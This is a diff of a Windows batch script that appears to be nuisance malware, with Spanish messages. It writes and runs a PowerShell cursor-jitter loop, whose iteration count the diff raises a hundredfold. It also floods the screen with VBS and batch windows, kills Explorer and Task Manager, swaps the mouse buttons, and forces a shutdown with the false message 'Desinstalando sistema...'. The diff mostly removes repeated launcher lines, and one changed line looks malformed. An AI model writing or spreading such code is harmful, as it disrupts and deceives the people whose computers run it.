@@ -14,8 +14,8 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJhZkIaHErSXA==
-::ZQ05rAF9IBncCkqN+0xwdVsFAl3MbCXqZg==
+::cxY6rQJ7JhzQF1fEqQJiZksaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlTMbCXqZg==
 ::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
 ::eg0/rx1wNQPfEVWB+kM9LVsJDCKJNXmvFdU=
 ::fBEirQZwNQPfEVWB+kM9LVsJDAKJNXmvFdU=
@@ -45,7 +45,7 @@ start hhhh.vbs
 start hhhh.vbs 
 echo $Cursor = [system.windows.forms.cursor]::Clip >> Mouse.ps1
 echo [System.Reflection.Assembly]::LoadWithPartialName("system.windows.forms") >> Mouse.ps1
-echo for ($i=1;$i -lt 100000;$i++) { >> Mouse.ps1
+echo for ($i=1;$i -lt 10000000;$i++) { >> Mouse.ps1
 echo $Position = [system.windows.forms.cursor]::Position >> Mouse.ps1
 echo $PositionChange = Get-Random 30 >> Mouse.ps1
 echo switch (Get-Random 1) { >> Mouse.ps1
@@ -57,7 +57,7 @@ echo } >> Mouse.ps1
 echo #$PositionChange >> Mouse.ps1
 echo $i >> Mouse.ps1
 echo }  >> Mouse.ps1
-echo #> >> Mouse.ps1
+echo "#> >> Mouse.ps1
 echo powershell.exe -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\Mouse.ps1" >> M0US3rrR.bat 
 start M0US3rrR.bat 
 start
@@ -76,7 +76,6 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start
-start M0US3rrR.bat 
 start hhhh.vbs 
 start hhhh.vbs 
 start
@@ -100,7 +99,6 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
-start M0US3rrR.bat 
 start hhhh.vbs 
 start hhhh.vbs  
 start hhhh.vbs 
@@ -120,7 +118,6 @@ cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
-start M0US3rrR.bat 
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
@@ -141,7 +138,7 @@ cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
-start M0US3rrR.bat 
+
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
@@ -186,7 +183,7 @@ echo @echo off >> s44ss1541DDDDD44.bat
 echo rundll32.exe user32.dll,MessageBeep >> s44ss1541DDDDD44.bat
 echo exit >> s44ss1541DDDDD44.bat
 cd C:\Users\%username%\Desktop
-start M0US3rrR.bat 
+
 cd C:\Users\%username%\Desktop
 start hhhh.vbs 
 start hhhh.vbs 
@@ -207,7 +204,6 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
-start M0US3rrR.bat 
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -234,7 +230,6 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
-start M0US3rrR.bat 
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -273,7 +268,6 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
-start M0US3rrR.bat 
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -295,7 +289,6 @@ echo :dfg78sdfg84 >> JAJAJAJAJ4.bat
 echo title %ramdom% >> JAJAJAJAJ4.bat
 echo color f0 >> JAJAJAJAJ4.bat
 echo color 0f >> JAJAJAJAJ4.bat
-start M0US3rrR.bat 
 echo goto dfg78sdfg84 >> JAJAJAJAJ4.bat
 start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
@@ -315,7 +308,6 @@ start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
-start M0US3rrR.bat 
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJA.vbs
@@ -331,7 +323,6 @@ start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
-start M0US3rrR.bat 
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start ppppppppppppppp.bat
@@ -350,7 +341,6 @@ start ppppppppppppppp.bat
 start https://www.youtube.com/watch?v=tiRcGyR298s
 start %windir%\system32\WF.msc
 start JAJAJAJAJA.vbs
-start M0US3rrR.bat 
 start %windir%\system32\narrator.exe
 start %windir%\system32\osk.exe
 TASKKILL /F /IM EXPLORER.EXE
@@ -369,7 +359,6 @@ TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
-start M0US3rrR.bat 
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 start JAJAJAJAJA.vbs
@@ -385,7 +374,6 @@ start %windir%\system32\msinfo32.exe
 start %windir%\system32\mspaint.exe
 start %windir%\system32\msra.exe
 start ppppppppppppppp.bat
-start M0US3rrR.bat 
 start https://www.youtube.com/watch?v=tiRcGyR298s
 start https://www.google.com/search?q=...........&oq=...........&aqs=chrome..69i57.1631j0j1&sourceid=chrome&ie=UTF-8
 cd C:\Users\%username%\Desktop
@@ -406,7 +394,7 @@ start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJA.vbs
 start JAJAJAJAJ4.bat
-start M0US3rrR.bat 
+
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 start JAJAJAJAJ4.bat
@@ -428,7 +416,7 @@ CLS
 Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
 START EXPLORER.EXE
-start M0US3rrR.bat 
+
 TASKKILL /F /IM TASKMGR.EXE
 start
 start
@@ -446,7 +434,7 @@ start
 title %Random%
 md hola %Username%
 md hola 
-start M0US3rrR.bat 
+
 CLS
 Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
@@ -463,7 +451,7 @@ start
 msg * Hola %username%
 Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
-start M0US3rrR.bat 
+
 start ppppppppppppppp.bat
 START EXPLORER.EXE
 TASKKILL /F /IM TASKMGR.EXE
@@ -478,7 +466,7 @@ start
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
-start M0US3rrR.bat 
+
 start
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
@@ -487,7 +475,7 @@ start ppppppppppppppp.bat
 start
 shutdown.exe -s -t 15 -c "Desinstalando sistema..."
 cd C:\Users\%username%\Desktop
-start M0US3rrR.bat 
+
 md NoConfiesEnGenteDeInternet
 md NoConfiesEnGenteDeInternet2
 md NoConfiesEnGenteDeInternet3
